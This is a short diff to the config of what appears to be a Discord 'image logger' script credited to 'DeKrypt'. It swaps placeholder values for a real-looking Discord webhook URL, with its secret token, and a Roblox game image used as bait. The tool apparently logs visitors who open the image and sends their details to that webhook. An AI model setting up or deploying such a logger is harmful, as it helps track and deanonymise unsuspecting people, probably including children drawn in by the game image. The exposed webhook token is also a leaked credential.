@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445939458250772733/nS9H0u6ei6V_0DYDbbcvWjwvDjMvhy-eRpYohPJYxKrA1yqweD72wNuvoLRRdr5SR8R7",
+    "image": "https://media.pocketgamer.com/artwork/na-24515-1764547375/roblox-the-forge-angel-class_jpg_820.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
